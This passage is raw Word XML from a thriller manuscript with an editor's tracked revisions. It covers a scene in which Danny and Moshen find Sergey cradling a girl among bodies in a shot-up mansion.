        </w:rPr>
        <w:t xml:space="preserve">unpowder </w:t>
      </w:r>
      <w:r w:rsidR="00013582">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>residue</w:t>
      </w:r>
      <w:r w:rsidR="00825441">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="00825441">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>train-rails</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> stink of blood</w:t>
      </w:r>
      <w:r w:rsidR="00BB5079">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tanged in the air</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He and Moshen proceeded cautiously toward the wide, elegant spiral stairs</w:t>
      </w:r>
      <w:r w:rsidR="00BC7F98">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ivan’s mercenaries and concubines </w:t>
      </w:r>
      <w:del w:id="2966" w:author="TextVet" w:date="2016-03-29T10:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00396326">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>track</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2967" w:author="TextVet" w:date="2016-03-29T10:16:00Z">
        <w:r w:rsidR="00396326">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>monitor</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="2968" w:author="TextVet" w:date="2016-03-29T10:18:00Z">
        <w:r w:rsidR="006C1147">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2969" w:author="TextVet" w:date="2016-03-29T10:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006C1147">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them silently</w:t>
      </w:r>
      <w:del w:id="2970" w:author="TextVet" w:date="2016-03-29T10:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00396326">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2971" w:author="TextVet" w:date="2016-03-29T10:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00396326">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>their</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="2972" w:author="TextVet" w:date="2016-03-29T10:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00396326">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> eyes</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2973" w:author="TextVet" w:date="2016-03-29T10:19:00Z">
        <w:r w:rsidR="00BC7F98">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2974" w:author="TextVet" w:date="2016-03-29T10:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BC7F98">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975" w:author="TextVet" w:date="2016-03-29T10:19:00Z">
        <w:r w:rsidR="00BC7F98">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2976" w:author="TextVet" w:date="2016-03-29T10:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BC7F98">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he</w:t>
      </w:r>
      <w:del w:id="2977" w:author="TextVet" w:date="2016-03-29T10:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA506D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>y</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2978" w:author="TextVet" w:date="2016-03-29T10:18:00Z">
        <w:r w:rsidR="00DA506D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> pair</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> slowly ascended</w:t>
      </w:r>
      <w:del w:id="2979" w:author="TextVet" w:date="2016-03-29T10:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006C1147">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to the second floor</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stairs opened out to a wide carpeted floor</w:t>
      </w:r>
      <w:ins w:id="2980" w:author="TextVet" w:date="2016-03-29T10:21:00Z">
        <w:r w:rsidR="0026163D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2981" w:author="TextVet" w:date="2016-03-29T10:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0026163D">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982" w:author="TextVet" w:date="2016-03-29T10:21:00Z">
        <w:r w:rsidR="0026163D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>A</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2983" w:author="TextVet" w:date="2016-03-29T10:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0026163D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>with a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> conference room </w:t>
      </w:r>
      <w:ins w:id="2984" w:author="TextVet" w:date="2016-03-29T10:21:00Z">
        <w:r w:rsidR="0026163D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>swallowed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2985" w:author="TextVet" w:date="2016-03-29T10:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0026163D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>on</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> one side</w:t>
      </w:r>
      <w:ins w:id="2986" w:author="TextVet" w:date="2016-03-29T10:22:00Z">
        <w:r w:rsidR="0026163D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2987" w:author="TextVet" w:date="2016-03-29T10:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0026163D">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a hallway of bedrooms </w:t>
      </w:r>
      <w:del w:id="2988" w:author="TextVet" w:date="2016-03-29T10:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0026163D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">on </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the other. The glass walls of the conference room were shattered. Bodies lay sprawled across a bullet-chipped table.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the bedrooms came a child’s sobbing.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sound led Danny to an open doorway. The door itself lay flat on the floor,</w:t>
      </w:r>
      <w:del w:id="2989" w:author="TextVet" w:date="2016-03-29T10:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E76D3B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> torn chunks of wood hanging from its hinges. Inside, Sergey knelt beside a bed. His helmet and shield lay on the floor nearby. In his arms, he cradled a twelve-year-old girl.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00AC6A68" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2990" w:author="TextVet" w:date="2016-03-29T10:24:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Quizzically, s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2991" w:author="TextVet" w:date="2016-03-29T10:24:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00AC6A68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>S</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:ins w:id="2992" w:author="TextVet" w:date="2016-03-29T10:24:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>watched</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2993" w:author="TextVet" w:date="2016-03-29T10:24:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00AC6A68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>saw</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Danny enter the bedroom</w:t>
      </w:r>
      <w:del w:id="2994" w:author="TextVet" w:date="2016-03-29T10:24:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00AC6A68">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, and looked at him with curiosity</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488"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Sergey noticed her </w:t>
      </w:r>
      <w:ins w:id="2995" w:author="TextVet" w:date="2016-03-29T10:26:00Z">
        <w:r w:rsidR="003E1141">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>staring at</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2996" w:author="TextVet" w:date="2016-03-29T10:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003E1141">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>eyes pointing at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the doorway</w:t>
      </w:r>
      <w:ins w:id="2997" w:author="TextVet" w:date="2016-03-29T10:27:00Z">
        <w:r w:rsidR="00562B56">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2998" w:author="TextVet" w:date="2016-03-29T10:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00562B56">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999" w:author="TextVet" w:date="2016-03-29T10:27:00Z">
        <w:r w:rsidR="00562B56">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3000" w:author="TextVet" w:date="2016-03-29T10:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00562B56">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:del w:id="3001" w:author="TextVet" w:date="2016-03-29T10:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003E1141">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">reacted by </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>instantly sw</w:t>
      </w:r>
      <w:ins w:id="3002" w:author="TextVet" w:date="2016-03-29T10:27:00Z">
        <w:r w:rsidR="003E1141">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>u</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3003" w:author="TextVet" w:date="2016-03-29T10:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003E1141">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ng</w:t>
      </w:r>
      <w:del w:id="3004" w:author="TextVet" w:date="2016-03-29T10:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003E1141">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his MAC-10</w:t>
      </w:r>
      <w:ins w:id="3005" w:author="TextVet" w:date="2016-03-29T10:27:00Z">
        <w:r w:rsidR="003E1141">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> round</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dove</w:t>
      </w:r>
      <w:del w:id="3006" w:author="TextVet" w:date="2016-03-29T10:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006063AF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to the floor</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “Sergey, it’s </w:t>
      </w:r>
      <w:r w:rsidRPr="00245E2C">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3007" w:author="TextVet" w:date="2016-03-29T10:28:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>me</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Sergey’s eyebrows curled</w:t>
      </w:r>
      <w:del w:id="3008" w:author="TextVet" w:date="2016-03-29T10:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00192DF0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> quizzically</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Daniel?” His face was expressionless, but</w:t>
      </w:r>
      <w:del w:id="3009" w:author="TextVet" w:date="2016-03-29T10:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00927E76">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> streaks of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tears </w:t>
      </w:r>
      <w:ins w:id="3010" w:author="TextVet" w:date="2016-03-29T10:29:00Z">
        <w:r w:rsidR="00927E76">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>streaked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3011" w:author="TextVet" w:date="2016-03-29T10:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00927E76">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ran along</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the sides of his nose. </w:t>
      </w:r>
      <w:ins w:id="3012" w:author="TextVet" w:date="2016-03-29T10:30:00Z">
        <w:r w:rsidR="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Speechless, </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3013" w:author="TextVet" w:date="2016-03-29T10:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
